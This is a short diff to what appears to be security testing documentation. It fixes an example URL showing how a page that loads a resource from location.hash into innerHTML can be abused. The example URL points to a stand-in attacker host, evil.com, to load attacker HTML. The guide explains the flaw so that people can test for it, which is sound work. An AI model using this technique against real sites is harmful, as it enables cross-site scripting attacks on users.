@@ -57,7 +57,7 @@ Here is an example of a vulnerable page:
 
 The `location.hash` is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct `innerHTML`. An attacker could ask a victim to visit the following URL:
 
-`www.victim.com/\#http://evil.com/html.html`
+`www.victim.com/#http://evil.com/html.html`
 
 With the payload handler for `html.html`:
 
